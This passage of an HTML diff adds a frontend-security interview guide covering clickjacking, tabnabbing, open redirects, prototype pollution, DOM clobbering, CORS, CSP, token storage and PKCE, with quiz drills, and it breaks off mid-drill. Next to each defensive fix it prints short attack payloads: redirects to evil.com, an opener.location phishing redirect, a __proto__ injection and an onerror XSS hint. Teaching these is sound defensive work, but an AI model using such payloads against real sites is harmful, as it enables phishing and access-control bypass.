+        <p>The attacker loads your page in a transparent <code class="k">&lt;iframe&gt;</code> stacked under bait — a game, a &ldquo;play&rdquo; button, a cookie banner. The victim thinks they're clicking the bait; the click lands on your <em>Confirm order</em> button, inside their authenticated session. Nothing is injected and nothing is read: the attacker borrows a real click.</p>
+        <p>Variants: <strong>likejacking</strong> (social widgets), <strong>cursorjacking</strong> (a fake cursor drawn offset from the real one), and drag-and-drop tricks that pull text out of a framed document.</p>
+        <div class="fix"><b>Fix</b>Send <code class="k">Content-Security-Policy: frame-ancestors 'none'</code> (or an explicit allowlist), which supersedes the legacy <code class="k">X-Frame-Options: DENY</code> — send both while you still support old browsers. For genuinely embeddable widgets, require an explicit gesture inside your own UI rather than a single click, and never rely on JavaScript frame-busting: <code class="k">sandbox</code> on the attacker's iframe disables it.</div>
+      </div>
+
+      <div class="atk">
+        <div class="atk-tag">Window handle leak</div>
+        <h4>Reverse tabnabbing</h4>
+        <p>A link with <code class="k">target="_blank"</code> hands the opened page a <code class="k">window.opener</code> reference. The new tab can then set <code class="k">opener.location</code> and silently replace <em>your</em> tab with a pixel-perfect fake login while the user reads the page they clicked through to. They tab back, see your domain's layout, and type their password.</p>
+        <pre><span class="cmt">// on the page the user opened, in a different origin</span>
+if (window.opener) window.opener.location = 'https://bank-example.evil/login';</pre>
+        <div class="fix"><b>Fix</b><code class="k">rel="noopener noreferrer"</code> on every outbound <code class="k">target="_blank"</code>. Modern browsers imply <code class="k">noopener</code>, but be explicit — user-generated links, markdown renderers and older webviews all still need it, and <code class="k">noreferrer</code> additionally stops leaking the URL the user came from.</div>
+      </div>
+
+      <div class="atk">
+        <div class="atk-tag">Trust transfer</div>
+        <h4>Open redirect</h4>
+        <p>Any endpoint that takes a destination from the URL and navigates to it — <code class="k">/login?next=…</code>, <code class="k">/logout?return=…</code>, <code class="k">/out?url=…</code>. The link the victim sees really is your domain, so it survives an eyeball check and a mail filter, and hands the attacker your reputation. It is also the standard escalation step for stealing OAuth codes: a redirect URI you accept becomes the attacker's collection point.</p>
+        <pre><span class="cmt">// all of these escape a naive "must start with /" check</span>
+/login?next=//evil.com          <span class="cmt">// protocol-relative → https://evil.com</span>
+/login?next=/\evil.com          <span class="cmt">// backslash, normalised by some parsers</span>
+/login?next=https://evil.com</pre>
+        <div class="fix"><b>Fix</b>Don't reflect URLs. Store the destination server-side against the session, or accept only a path and rebuild the URL yourself: <code class="k">const u = new URL(next, location.origin); if (u.origin !== location.origin) reject();</code> — and allowlist the paths you actually redirect to.</div>
+      </div>
+
+      <div class="atk">
+        <div class="atk-tag">JavaScript-specific</div>
+        <h4>Prototype pollution</h4>
+        <p>A recursive merge, a query-string parser or a deep-clone that copies a <code class="k">__proto__</code> or <code class="k">constructor.prototype</code> key writes onto <code class="k">Object.prototype</code>. Every object in the process suddenly inherits the attacker's property. On its own that's a weird bug; combined with a <em>gadget</em> — some library that reads an option it assumes is undefined — it becomes DOM XSS or a bypassed access check.</p>
+        <pre>merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
+({}).isAdmin;                <span class="cmt">// true — everywhere in the app</span>
+
+<span class="cmt">// the gadget: a template library reading a config it never set</span>
+({}).innerHTML;              <span class="cmt">// now attacker-controlled</span></pre>
+        <div class="fix"><b>Fix</b>Reject the keys <code class="k">__proto__</code>, <code class="k">constructor</code> and <code class="k">prototype</code> at the parse boundary; build lookup objects with <code class="k">Object.create(null)</code> or a <code class="k">Map</code>; prefer <code class="k">structuredClone</code> and well-audited merge utilities over hand-rolled recursion; and <code class="k">Object.freeze(Object.prototype)</code> in the app entry point is a cheap, surprisingly compatible backstop.</div>
+      </div>
+
+      <div class="atk">
+        <div class="atk-tag">No script required</div>
+        <h4>DOM clobbering</h4>
+        <p>Named HTML elements become properties of <code class="k">window</code> and <code class="k">document</code>. Injected markup with an <code class="k">id</code> or <code class="k">name</code> can therefore <em>overwrite a global your code reads</em> — with no JavaScript at all, so it sails through sanitizers that only strip scripts and event handlers.</p>
+        <pre><span class="cmt">// injected as ordinary, script-free markup</span>
+&lt;a id="config" href="https://evil.com/x"&gt;&lt;/a&gt;
+
+<span class="cmt">// your code, which assumed config came from your own bundle</span>
+const url = window.config || DEFAULT;   <span class="cmt">// now the &lt;a&gt; element</span>
+script.src = url;                        <span class="cmt">// stringifies to the attacker's URL</span></pre>
+        <div class="fix"><b>Fix</b>Declare globals so they can't be clobbered (<code class="k">const</code>/<code class="k">let</code> at module scope, never implicit window properties), check types before use, strip <code class="k">id</code> and <code class="k">name</code> in your sanitizer config, and namespace anything that must be global under a single frozen object.</div>
+      </div>
+
+      <div class="atk">
+        <div class="atk-tag">Cross-window</div>
+        <h4>postMessage abuse</h4>
+        <p>Two mistakes, both common in embed and SSO code. <strong>Sending</strong> with a wildcard target — <code class="k">iframe.postMessage(token, '*')</code> — delivers your data to whatever origin currently occupies that frame, which the attacker may control by navigating it. <strong>Receiving</strong> without checking <code class="k">event.origin</code> means any page that can get a handle on your window can drive your message handler, and handlers routinely do privileged things like &ldquo;set the auth token&rdquo; or &ldquo;navigate&rdquo;.</p>
+        <pre>window.addEventListener('message', (e) =&gt; {
+  <span class="kw">if (e.origin !== 'https://trusted.example') return;</span>   <span class="cmt">// never optional</span>
+  if (e.source !== expectedFrame.contentWindow) return;   <span class="cmt">// belt and braces</span>
+  const msg = JSON.parse(e.data);                          <span class="cmt">// validate the shape too</span>
+});</pre>
+        <div class="fix"><b>Fix</b>Always pass an explicit target origin when sending, always compare <code class="k">event.origin</code> against an allowlist when receiving, validate the payload schema, and treat the message handler as a public API — because it is.</div>
+      </div>
+
+      <div class="atk">
+        <div class="atk-tag">Server config, frontend consequence</div>
+        <h4>CORS misconfiguration</h4>
+        <p>CORS <em>relaxes</em> the same-origin policy; it never tightens it. The classic hole is reflecting the request's <code class="k">Origin</code> header into <code class="k">Access-Control-Allow-Origin</code> together with <code class="k">Access-Control-Allow-Credentials: true</code> — that combination lets <strong>any</strong> site read authenticated responses from your API. Related mistakes: trusting a suffix match (<code class="k">evil-yourdomain.com</code> passes <code class="k">endsWith('yourdomain.com')</code>), and allowing the <code class="k">null</code> origin, which sandboxed iframes and <code class="k">data:</code> URLs can produce.</p>
+        <div class="fix"><b>Fix</b>An explicit allowlist of exact origins, echoed only on a match, plus <code class="k">Vary: Origin</code> so a cache never serves one origin's ACAO header to another. Wildcard <code class="k">*</code> is fine only for genuinely public, unauthenticated data — the browser already refuses to combine it with credentials.</div>
+      </div>
+
+      <div class="atk">
+        <div class="atk-tag">Third-party code</div>
+        <h4>Supply chain &amp; script skimming</h4>
+        <p>Every <code class="k">&lt;script src&gt;</code> you include runs with your origin's full authority — your analytics vendor can read the DOM of a payment form as easily as your own code can. Compromise arrives through a hijacked npm package (typosquatting, a maintainer account takeover, a malicious <code class="k">postinstall</code>, dependency confusion against a private scope) or through a CDN or tag manager serving altered JavaScript. The payment-page variant, quietly exfiltrating card fields, is the Magecart pattern.</p>
+        <pre><span class="cmt">// pin the exact bytes you audited</span>
+&lt;script src="https://cdn.example/lib.js"
+        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
+        crossorigin="anonymous"&gt;&lt;/script&gt;</pre>
+        <div class="fix"><b>Fix</b>Subresource Integrity on every third-party script, a committed lockfile with <code class="k">npm ci</code>, <code class="k">--ignore-scripts</code> in CI, automated dependency review, and a CSP allowlist so an injected script from an unexpected host can't load at all. For payment fields specifically, isolate them in a provider-hosted iframe so your origin never touches the card number — that is the actual reason Stripe Elements is an iframe.</div>
+      </div>
+
+      <h3>The long tail</h3>
+      <p>Worth recognising by name — a sentence each is usually enough in an interview:</p>
+      <table class="tbl wrapc">
+        <tr><th>Attack</th><th>Shape</th><th>Defense</th></tr>
+        <tr><td>Subdomain takeover</td><td>a dangling CNAME to a decommissioned host lets an attacker claim <code class="k">x.yourdomain.com</code> — and with it your domain-scoped cookies and any <code class="k">SameSite</code> trust</td><td>audit DNS, delete records with the service</td></tr>
+        <tr><td>Cookie tossing</td><td>a sibling subdomain writes a cookie on the parent domain, shadowing the real one</td><td><code class="k">__Host-</code> prefix (host-only, path <code class="k">/</code>, Secure)</td></tr>
+        <tr><td>Session fixation</td><td>attacker plants a known session id, then waits for the victim to log in with it</td><td>regenerate the session id on authentication</td></tr>
+        <tr><td>XS-Leaks / Spectre</td><td>cross-origin inference through timing, frame counts and shared caches</td><td>COOP + COEP + CORP; <code class="k">Cache-Control: no-store</code> on authenticated responses</td></tr>
+        <tr><td>ReDoS</td><td>a validation regex with catastrophic backtracking freezes the tab (or the Node server) on a crafted string</td><td>avoid nested quantifiers, bound input length, test with long adversarial inputs</td></tr>
+        <tr><td>Protocol downgrade</td><td>the first plaintext request is intercepted and rewritten</td><td>HSTS with <code class="k">includeSubDomains</code>, <code class="k">preload</code></td></tr>
+        <tr><td>MIME confusion</td><td>an uploaded &ldquo;image&rdquo; sniffed as HTML and executed in your origin</td><td><code class="k">X-Content-Type-Options: nosniff</code>, serve user files from a separate origin</td></tr>
+        <tr><td>Credential stuffing</td><td>reused passwords replayed at scale against your login</td><td>server-side rate limits, MFA — never a client-side check</td></tr>
+      </table>
+      <div class="note warn"><span class="lbl">The frontend axiom</span>Every validation you write in the browser is a <strong>usability</strong> feature. The attacker doesn't use your form — they use <code class="k">curl</code>. Client-side checks make the happy path pleasant; the server is where the rule is actually enforced, and saying so unprompted is usually what the question was testing.</div>
+    </section>
+
+    <section id="headers">
+      <div class="kicker">06 — Defense in depth</div>
+      <h2>Headers &amp; CSP</h2>
+      <p>Headers don't fix bugs; they cap the blast radius of the bug you haven't found. Knowing which header stops which attack is a high-signal, easy-to-verify thing to have memorised.</p>
+      <table class="tbl wrapc">
+        <tr><th>Header</th><th>Stops</th></tr>
+        <tr><td>Content-Security-Policy</td><td>injected/unauthorised script, and with <code class="k">frame-ancestors</code>, clickjacking</td></tr>
+        <tr><td>Strict-Transport-Security</td><td>protocol downgrade and cookie theft over plaintext</td></tr>
+        <tr><td>X-Content-Type-Options: nosniff</td><td>MIME sniffing an upload into executable HTML/JS</td></tr>
+        <tr><td>Referrer-Policy</td><td>leaking paths, ids and tokens in the <code class="k">Referer</code> of outbound requests</td></tr>
+        <tr><td>Permissions-Policy</td><td>third-party frames reaching camera, mic, geolocation, payment</td></tr>
+        <tr><td>Cross-Origin-Opener-Policy</td><td>cross-window references — severs <code class="k">window.opener</code> entirely</td></tr>
+        <tr><td>Cross-Origin-Resource-Policy</td><td>other origins embedding your resources (an XS-Leak primitive)</td></tr>
+        <tr><td>Cache-Control: no-store</td><td>authenticated pages persisting in a shared or browser cache</td></tr>
+      </table>
+
+      <h3>A CSP that actually holds</h3>
+      <p>Host allowlists are the trap: Google's survey of real deployments found roughly <strong>94%</strong> bypassable, usually through a JSONP endpoint or an open redirect on an allowlisted CDN. The modern shape is nonce-based:</p>
+      <pre>Content-Security-Policy:
+  script-src 'nonce-{random-per-response}' 'strict-dynamic';
+  object-src 'none';
+  base-uri 'none';
+  frame-ancestors 'none';
+  require-trusted-types-for 'script';</pre>
+      <ul class="body">
+        <li><strong>A fresh nonce per response</strong>, on every <code class="k">&lt;script&gt;</code> tag you emit. Reusing one across responses defeats the point.</li>
+        <li><strong><code class="k">'strict-dynamic'</code></strong> lets a trusted script load the scripts it needs, so bundlers and third-party loaders keep working without an allowlist.</li>
+        <li><strong><code class="k">object-src 'none'</code></strong> kills the plugin bypass; <strong><code class="k">base-uri 'none'</code></strong> stops an injected <code class="k">&lt;base&gt;</code> tag redirecting every relative script URL.</li>
+        <li><strong>No <code class="k">'unsafe-inline'</code>, no <code class="k">'unsafe-eval'</code></strong> — and note that a nonce makes browsers ignore <code class="k">'unsafe-inline'</code>, which is the compatibility trick for old clients.</li>
+        <li><strong>Roll out with <code class="k">Content-Security-Policy-Report-Only</code></strong> plus a <code class="k">report-to</code> endpoint, read the violations for a week, then enforce. Shipping a strict CSP blind breaks production.</li>
+      </ul>
+      <div class="note"><span class="lbl">Say this about CSP</span>&ldquo;It's a second line, not the first. Escaping and sanitizing prevent the injection; CSP is what limits the damage when one gets through. I'd deploy it nonce-based with <code class="k">strict-dynamic</code>, report-only first, and treat <code class="k">unsafe-inline</code> as a bug to burn down rather than a setting.&rdquo;</div>
+    </section>
+
+    <section id="storage">
+      <div class="kicker">07 — Where to keep a token</div>
+      <h2>Storage &amp; token trade-offs</h2>
+      <table class="tbl">
+        <tr><th></th><th>Cookie</th><th>localStorage</th><th>sessionStorage</th></tr>
+        <tr><td>Capacity</td><td>~4KB</td><td>~5&ndash;10MB</td><td>~5MB</td></tr>
+        <tr><td>Sent with requests</td><td>Yes, automatically</td><td>No</td><td>No</td></tr>
+        <tr><td>JS-accessible</td><td>No if HttpOnly</td><td>Yes</td><td>Yes</td></tr>
+        <tr><td>Lifetime</td><td>Expiry / session</td><td>Until cleared</td><td>Per tab, until close</td></tr>
+      </table>
+      <p>The classic auth-token question is a trade-off, not a &ldquo;correct answer&rdquo;:</p>
+      <ul class="body">
+        <li><strong>HttpOnly cookie</strong> — JavaScript can't read it, so an XSS can't steal it. But it's sent automatically, so you need <strong>CSRF defenses</strong> (SameSite, tokens).</li>
+        <li><strong><code class="k">localStorage</code></strong> — no CSRF (not auto-sent), but <em>any</em> XSS can read it and exfiltrate the token. It's also readable by any script on the page.</li>
+      </ul>
+      <div class="note warn"><span class="lbl">The senior answer</span>&ldquo;Prefer a short-lived access token in a <code class="k">__Host-</code>-prefixed, HttpOnly, Secure, <code class="k">SameSite=Lax</code> cookie with a refresh token, plus CSRF protection — so XSS can't <em>read</em> the token, though it can still ride the session and call your API as the user. (If you ever need <code class="k">SameSite=None</code> for a cross-site embed, <code class="k">Secure</code> is mandatory — browsers reject it otherwise.) Whatever you choose, XSS is the root risk: if an attacker runs script in your origin, most token schemes fall. So escaping/CSP come first.&rdquo;</div>
+    </section>
+
+    <section id="oauth">
+      <div class="kicker">08 — Getting the token in the first place</div>
+      <h2>OAuth in the browser &amp; PKCE</h2>
+      <p>The previous section asks <em>where you keep</em> a token. This one asks <em>how it reached the browser safely</em>. A single-page app is a <strong>public client</strong>: everything it ships is readable, so it cannot hold a client secret, and the flow has to stay secure without one. That constraint is the whole reason PKCE exists.</p>
+
+      <h3>Why the implicit flow died</h3>
+      <p>The original SPA answer was the <strong>implicit flow</strong>: the authorization server redirected back with the access token directly in the URL fragment. Every problem with it is a leak:</p>
+      <ul class="body">
+        <li><strong>The token is in a URL</strong> &mdash; so it lands in browser history, in the <code class="k">Referer</code> of the next outbound request, in any analytics that records <code class="k">location.href</code>, and in server logs if a redirect ever turns the fragment into a query.</li>
+        <li><strong>No way to authenticate the client</strong>, so the server cannot tell your app from a copy of it.</li>
+        <li><strong>No refresh token</strong> in practice, which pushed apps toward long-lived access tokens &mdash; exactly the wrong direction.</li>
+      </ul>
+      <p>The replacement is the <strong>authorization code flow</strong>, which returns a short-lived, single-use <em>code</em> in the redirect and exchanges it for tokens over a back-channel <code class="k">POST</code>. But a confidential client proves it owns that code with its client secret, and an SPA has no secret &mdash; which leaves the code interception attack.</p>
+
+      <h3>The attack PKCE actually stops</h3>
+      <p>The authorization code travels through the least trustworthy leg of the flow: a redirect, through the user agent. If an attacker can observe that redirect &mdash; a malicious app registered on the same custom URL scheme on mobile, a compromised browser extension, a proxy, an open redirect on your own domain that forwards the query string &mdash; they can steal the code and redeem it themselves. Without a secret, the token endpoint has no way to tell them apart from you.</p>
+      <div class="note warn"><span class="lbl">Name it precisely</span>PKCE (RFC 7636, &ldquo;pixie&rdquo; &mdash; Proof Key for Code Exchange) defends against <strong>authorization code interception</strong>. It is <em>not</em> a CSRF defense, and it does not protect the token once you hold it. Saying &ldquo;PKCE replaces the client secret with a per-request one&rdquo; is the one-line version that lands.</div>
+
+      <h3>How it works</h3>
+      <p>The client invents a fresh secret per authorization request, commits to it with a hash up front, then reveals it at redemption. The commitment travels through the untrusted redirect; the secret itself never does.</p>
+      <ul class="body">
+        <li><strong>1. Generate a <code class="k">code_verifier</code></strong> &mdash; 43&ndash;128 characters of cryptographically random <code class="k">[A-Za-z0-9-._~]</code>. Keep it in the tab.</li>
+        <li><strong>2. Derive the <code class="k">code_challenge</code></strong> &mdash; <code class="k">BASE64URL(SHA-256(verifier))</code>, sent on the <code class="k">/authorize</code> redirect along with <code class="k">code_challenge_method=S256</code>. The server stores it against the code it issues.</li>
+        <li><strong>3. Redeem</strong> &mdash; <code class="k">POST /token</code> with the code <em>and</em> the raw <code class="k">code_verifier</code>. The server hashes the verifier and compares it to the challenge it stored.</li>
+        <li><strong>4. Mismatch or missing verifier &rarr; rejected.</strong> An attacker holding a stolen code has the challenge (it was in the URL) but not the pre-image, and SHA-256 is one-way.</li>
+      </ul>
+      <pre><span class="cmt">// the whole client side of PKCE, in the platform crypto API</span>
+const rnd = crypto.getRandomValues(new Uint8Array(32));
+const b64url = (buf) =&gt; btoa(String.fromCharCode(...new Uint8Array(buf)))
+  .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+
+const verifier  = b64url(rnd);                     <span class="cmt">// 43 chars, keep it</span>
+const digest    = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(verifier));
+const challenge = b64url(digest);                  <span class="cmt">// send this</span>
+
+sessionStorage.setItem('pkce_verifier', verifier); <span class="cmt">// per tab, deleted after exchange</span>
+location.assign(`${AUTH}/authorize?${new URLSearchParams({
+  response_type: 'code', client_id: CLIENT_ID, redirect_uri: REDIRECT,
+  scope: 'openid profile', state: b64url(crypto.getRandomValues(new Uint8Array(16))),
+  code_challenge: challenge, code_challenge_method: 'S256',
+})}`);</pre>
+      <div class="note"><span class="lbl">Why <code class="k">S256</code> and not <code class="k">plain</code></span>The spec also defines <code class="k">code_challenge_method=plain</code>, where the challenge <em>is</em> the verifier. That is worthless against the exact attacker PKCE assumes &mdash; whoever intercepts the redirect reads the verifier straight out of it. <code class="k">plain</code> exists only for clients that genuinely cannot compute SHA-256; every browser can. Servers should reject <code class="k">plain</code>, and a client must refuse to <em>downgrade</em> if the server pretends not to support <code class="k">S256</code>.</div>
+
+      <h3>state vs PKCE vs nonce &mdash; three different jobs</h3>
+      <p>This is the trap question, because all three are random values you attach to the same redirect. They defend against different things and none substitutes for another:</p>
+      <table class="tbl wrapc">
+        <tr><th>Parameter</th><th>Stops</th><th>Checked by</th></tr>
+        <tr><td><code class="k">code_verifier</code> / PKCE</td><td>Authorization <strong>code interception</strong> &mdash; someone else redeeming your code</td><td>The authorization server, at <code class="k">/token</code></td></tr>
+        <tr><td><code class="k">state</code></td><td><strong>CSRF on the callback</strong> &mdash; an attacker feeding you <em>their</em> code so you end up logged into their account</td><td>Your client, on the redirect back</td></tr>
+        <tr><td><code class="k">nonce</code> (OIDC)</td><td><strong>ID token replay</strong> &mdash; an older or borrowed ID token injected into your session</td><td>Your client, inside the ID token claims</td></tr>
+      </table>
+      <p>PKCE does incidentally break the classic code-injection variant of login CSRF &mdash; the injected code fails the verifier check &mdash; which is why some servers now treat <code class="k">state</code> as optional. Send it anyway: it is one line, it is the only thing that survives if PKCE is misconfigured, and it is where you round-trip the &ldquo;return to this page after login&rdquo; value.</p>
+
+      <h3>Getting the details right</h3>
+      <ul class="body">
+        <li><strong>One verifier per authorization request</strong>, freshly random, from <code class="k">crypto.getRandomValues</code> &mdash; never <code class="k">Math.random()</code>, which is not cryptographic and is predictable from a few outputs.</li>
+        <li><strong><code class="k">sessionStorage</code>, then delete it</strong> right after the exchange. It is per-tab, so two parallel logins do not overwrite each other, and it dies with the tab. A verifier left behind is a live credential for a code that has not been redeemed.</li>
+        <li><strong>Exact redirect URI matching</strong> on the server &mdash; no wildcards, no prefix matching. Combined with an open redirect on an allowed URI, loose matching hands the code to the attacker, which is precisely the escalation in the <a href="#attacks">attack catalogue</a>.</li>
+        <li><strong>The code is single-use and short-lived</strong> (seconds, not minutes). A server seeing a code redeemed twice should revoke the tokens it already issued for it.</li>
+        <li><strong>Refresh tokens for a public client must rotate</strong>, with reuse detection: replaying an old refresh token kills the whole chain. A non-rotating refresh token in a browser is a long-lived bearer credential.</li>
+        <li><strong>Handle the callback then clean the URL</strong> &mdash; <code class="k">history.replaceState</code> the code and state out before anything else can read <code class="k">location.href</code>.</li>
+      </ul>
+
+      <div class="note gold"><span class="lbl">Where PKCE stops helping</span>PKCE secures the <em>exchange</em>. It does nothing about what happens next: if the resulting access token sits in <code class="k">localStorage</code>, one XSS still exfiltrates it, and the attacker can even run the whole PKCE dance invisibly in your origin against a still-valid session cookie at the authorization server. That is the argument for the <strong>BFF pattern</strong> &mdash; a thin server-side component does the code exchange, holds the tokens, and hands the browser only an <code class="k">HttpOnly</code>, <code class="k">Secure</code>, <code class="k">SameSite</code> session cookie. Browser-based apps that keep tokens in JS are accepting XSS as a total-compromise risk.</div>
+
+      <div class="note"><span class="lbl">Say this</span>&ldquo;An SPA is a public client, so the implicit flow is out &mdash; tokens in URLs leak through history and referrers. I'd use authorization code with PKCE: a random <code class="k">code_verifier</code> per request, <code class="k">S256</code> challenge on the <code class="k">/authorize</code> redirect, verifier on the token exchange, so a stolen code is useless without the pre-image. <code class="k">state</code> still goes on for callback CSRF, and a <code class="k">nonce</code> if we're using OIDC. PKCE is mandatory for every client in OAuth 2.1, including confidential ones, because a leaked secret alone no longer redeems a code. And if I can put a BFF in front of it I will, so the tokens never touch JavaScript at all.&rdquo;</div>
+    </section>
+
+    <section id="drills">
+      <div class="kicker">09 — Drill until reflex</div>
+      <h2>Scenario drills</h2>
+
+      <div class="quizcard" data-quiz>
+        <div class="q">Drill 1 — target vs currentTarget</div>
+        <pre>ul.addEventListener('click', (e) =&gt; {
+  console.log(e.target.tagName, e.currentTarget.tagName);
+});
+<span class="cmt">// user clicks a &lt;span&gt; inside an &lt;li&gt; inside the &lt;ul&gt;</span></pre>
+        <button class="reveal-btn">Reveal answer &amp; reasoning</button>
+        <div class="answer"><div class="out-line">SPAN UL</div>
+          <p style="margin:0"><code class="k">target</code> is where the event originated (the span the user actually clicked); <code class="k">currentTarget</code> is the element whose listener is running (the ul). Delegation uses this: one listener on the ul, <code class="k">target.closest()</code> to find the row.</p></div>
+      </div>
+
+      <div class="quizcard" data-quiz>
+        <div class="q">Drill 2 — stopPropagation vs preventDefault</div>
+        <div class="q" style="font-weight:400;color:var(--muted);font-size:15px">&ldquo;A link inside a clickable card navigates AND triggers the card's onClick. How do you stop only the navigation? Only the card handler?&rdquo;</div>
+        <button class="reveal-btn">Reveal a strong answer</button>
+        <div class="answer">
+          <p style="margin:0">To stop navigation, call <code class="k">preventDefault()</code> on the link's click (cancels the default action, propagation still happens). To stop the card's handler from also firing, call <code class="k">stopPropagation()</code> (halts bubbling). They're independent: one cancels the browser default, the other stops the event travelling.</p></div>
+      </div>
+
+      <div class="quizcard" data-quiz>
+        <div class="q">Drill 3 — spot the XSS</div>
+        <pre>&lt;div dangerouslySetInnerHTML={{ __html: comment }} /&gt;</pre>
+        <button class="reveal-btn">Reveal answer &amp; reasoning</button>
+        <div class="answer"><div class="out-line">Stored XSS if comment is user-supplied</div>
+          <p style="margin:0">This bypasses React's auto-escaping and injects raw HTML — a malicious comment can include an event-handler payload such as <code class="k">&lt;img src=x onerror=...&gt;</code> that runs in your origin (a bare <code class="k">&lt;script&gt;</code> inserted this way isn't executed, but <code class="k">onerror</code>/<code class="k">onload</code> attributes are). Render it as text (<code class="k">{comment}</code>) if possible, or sanitize with DOMPurify before setting it, and add a CSP.</p></div>
+      </div>
+
+      <div class="quizcard" data-quiz>
+        <div class="q">Drill 4 — cookie or localStorage?</div>
+        <div class="q" style="font-weight:400;color:var(--muted);font-size:15px">&ldquo;Where do you store the auth token for a trading app, and why?&rdquo;</div>
+        <button class="reveal-btn">Reveal a strong answer</button>
+        <div class="answer">
+          <p style="margin:0">Prefer a short-lived access token in an HttpOnly, Secure, SameSite cookie (plus a refresh token) so JavaScript — and therefore any XSS — can't read it; add CSRF protection because cookies are auto-sent. localStorage avoids CSRF but is readable by any script, so one XSS leaks it. Either way, XSS is the root risk, so output escaping and a CSP come first.</p></div>
+      </div>
+
+      <div class="quizcard" data-quiz>
+        <div class="q">Drill 5 — XSS vs CSRF in one line</div>
+        <button class="reveal-btn">Reveal a strong answer</button>
+        <div class="answer">
+          <p style="margin:0">XSS = the attacker runs <em>their script in your origin</em> (mitigate with escaping/CSP/sanitization). CSRF = the attacker makes <em>the victim's browser send an authenticated request</em> using auto-sent cookies, without reading the response (mitigate with SameSite cookies, CSRF tokens, Origin checks).</p></div>
+      </div>
+
+      <div class="quizcard" data-quiz>
+        <div class="q">Drill 6 — the invisible click</div>
+        <div class="q" style="font-weight:400;color:var(--muted);font-size:15px">&ldquo;A user reports orders they never placed. Logs show a normal, authenticated POST from their own browser with a valid CSRF token and a real session. What class of attack fits, and what header would have stopped it?&rdquo;</div>
+        <button class="reveal-btn">Reveal answer &amp; reasoning</button>
+        <div class="answer"><div class="out-line">Clickjacking — CSP: frame-ancestors 'none'</div>
+          <p style="margin:0">Everything about the request is genuine, because the <em>user really did click</em> — inside a transparent iframe of your app, positioned under bait on the attacker's page. CSRF tokens don't help: the click happens in your origin, so the token is present and correct. The fix is refusing to be framed — <code class="k">Content-Security-Policy: frame-ancestors 'none'</code>, with <code class="k">X-Frame-Options: DENY</code> alongside for old browsers. JavaScript frame-busting doesn't count; the attacker's <code class="k">sandbox</code> attribute disables it.</p></div>
+      </div>
+
+      <div class="quizcard" data-quiz>
+        <div class="q">Drill 7 — the link that rewrites the tab behind it</div>
+        <pre>&lt;a href={post.url} target="_blank"&gt;{post.title}&lt;/a&gt;
+<span class="cmt">// post.url comes from user-submitted content</span></pre>
+        <button class="reveal-btn">Reveal answer &amp; reasoning</button>
+        <div class="answer"><div class="out-line">Reverse tabnabbing — add rel="noopener noreferrer"</div>
+          <p style="margin:0">The opened page gets a <code class="k">window.opener</code> handle and can set <code class="k">opener.location</code>, silently swapping your still-open tab for a fake login. Modern browsers imply <code class="k">noopener</code> for <code class="k">target="_blank"</code>, but be explicit for user-generated links, markdown renderers and webviews — and <code class="k">noreferrer</code> also stops leaking the URL they came from. Since <code class="k">post.url</code> is user-supplied, validate the scheme too: a <code class="k">javascript:</code> href here is straight DOM XSS.</p></div>
+      </div>
+
+      <div class="quizcard" data-quiz>
+        <div class="q">Drill 8 — spot the pollution</div>
+        <pre>function merge(target, src) {
+  for (const k in src) {
+    if (typeof src[k] === 'object') merge(target[k] ??= {}, src[k]);
+    else target[k] = src[k];
+  }
+  return target;
+}
+merge(defaults, JSON.parse(req.body));</pre>
+        <button class="reveal-btn">Reveal answer &amp; reasoning</button>
+        <div class="answer"><div class="out-line">Prototype pollution via __proto__</div>
+          <p style="margin:0">A body of <code class="k">{"__proto__": {"isAdmin": true}}</code> walks into <code class="k">target["__proto__"]</code>, which <em>is</em> <code class="k">Object.prototype</code>, and writes there — so every object in the process now inherits <code class="k">isAdmin</code>. Alone it's odd; with a gadget (a library reading an option it assumes is undefined) it becomes DOM XSS or an authorisation bypass. Fix: skip the keys <code class="k">__proto__</code>, <code class="k">constructor</code> and <code class="k">prototype</code>, use <code class="k">Object.create(null)</code> or a <code class="k">Map</code> for dictionaries, prefer <code class="k">structuredClone</code>, and consider <code class="k">Object.freeze(Object.prototype)</code> as a backstop.</p></div>
+      </div>
+
+      <div class="quizcard" data-quiz>
+        <div class="q">Drill 9 — the two CORS headers that shouldn't meet</div>
+        <pre>Access-Control-Allow-Origin: &lt;echoes back the request's Origin&gt;
+Access-Control-Allow-Credentials: true</pre>
+        <button class="reveal-btn">Reveal answer &amp; reasoning</button>
+        <div class="answer"><div class="out-line">Any site can now read authenticated responses</div>
+          <p style="margin:0">Reflecting the <code class="k">Origin</code> means every origin is allowed, and <code class="k">Allow-Credentials: true</code> means the browser attaches cookies <em>and</em> hands the response to that page's JavaScript. That's full account read from any site the victim visits. Fix: an exact allowlist, echoed only on a match, plus <code class="k">Vary: Origin</code> so caches don't cross the wires. Note this is a <em>read</em> vulnerability — CORS was never a CSRF defense, since a restrictive policy still lets the request through and execute.</p></div>
+      </div>
+
+      <div class="quizcard" data-quiz>
+        <div class="q">Drill 10 — the redirect on your own domain</div>
+        <pre>const next = new URLSearchParams(location.search).get('next');
+if (next?.startsWith('/')) location.assign(next);</pre>
+        <button class="reveal-btn">Reveal answer &amp; reasoning</button>
+        <div class="answer"><div class="out-line">Open redirect — //evil.com starts with "/"</div>
+          <p style="margin:0">A protocol-relative URL passes <code class="k">startsWith('/')</code> and navigates to <code class="k">https://evil.com</code>; some parsers normalise <code class="k">/\evil.com</code> the same way. The link genuinely is your domain, so it survives an eyeball check and a mail filter, and the same flaw is the standard step for stealing OAuth codes. Fix: resolve and compare the origin — <code class="k">const u = new URL(next, location.origin); if (u.origin !== location.origin) return;</code> — or better, keep the destination server-side against the session.</p></div>
+      </div>
+
+      <div class="quizcard" data-quiz>
+        <div class="q">Drill 11 — the message handler</div>
+        <pre>window.addEventListener('message', (e) =&gt; {
+  const { type, token } = JSON.parse(e.data);
+  if (type === 'auth') localStorage.setItem('token', token);
+});</pre>
+        <button class="reveal-btn">Reveal answer &amp; reasoning</button>
+        <div class="answer"><div class="out-line">No origin check — any page can set your auth token</div>
